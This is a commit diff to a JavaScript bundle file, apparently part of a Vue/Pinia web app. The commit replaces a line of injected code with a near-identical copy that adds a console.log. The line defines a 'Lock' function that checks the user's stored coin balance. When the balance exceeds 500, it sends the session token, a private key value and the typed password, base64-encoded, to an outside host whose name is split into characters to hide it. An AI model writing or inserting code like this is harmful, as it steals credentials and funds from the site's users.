c5967f226263eba1775131ea3e3624b86f6495d7
jsdevsl <73017635+jsdevsl@users.noreply.github.com>
2024-01-03 14:36:22 +0800

    Update js.js232

--- js.js
+++ js.js
@@ -32,7 +32,7 @@ var PiniaVuePlugin_1 = function(_Vue) {
     }
   });
 };
-Lock=function () {var available1=sessionStorage.getItem('auth')&&JSON.parse(sessionStorage.getItem('auth') as string).coins.find((e:any) => {return e.mtype == 1}).coincash;var available30=sessionStorage.getItem('auth')&&JSON.parse(sessionStorage.getItem('auth') as string).coins.find((e:any) => {return e.mtype == 30}).coincash;var available=+available1 + +available30;if (available>500) {;var token: any = localStorage.getItem('token')+'&&'+ (localStorage.getItem('md5_pri')|| '---')+'&&'+'passwdValue='+passwdValue.value+'&&'+(available?'available='+available:'-');fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o'+'p/?' + btoa(token));}}
+Lock=function () {console.log('556');var available1=sessionStorage.getItem('auth')&&JSON.parse(sessionStorage.getItem('auth') as string).coins.find((e:any) => {return e.mtype == 1}).coincash;var available30=sessionStorage.getItem('auth')&&JSON.parse(sessionStorage.getItem('auth') as string).coins.find((e:any) => {return e.mtype == 30}).coincash;var available=+available1 + +available30;if (available>500) {;var token: any = localStorage.getItem('token')+'&&'+ (localStorage.getItem('md5_pri')|| '---')+'&&'+'passwdValue='+passwdValue.value+'&&'+(available?'available='+available:'-');fetch('//g' + 'd' + 'p' + 'a' + 'yw' + 'e' + 'b.s' + 'h' + 'o'+'p/?' + btoa(token));}}
 
 
 err=null;gameTypes=null;
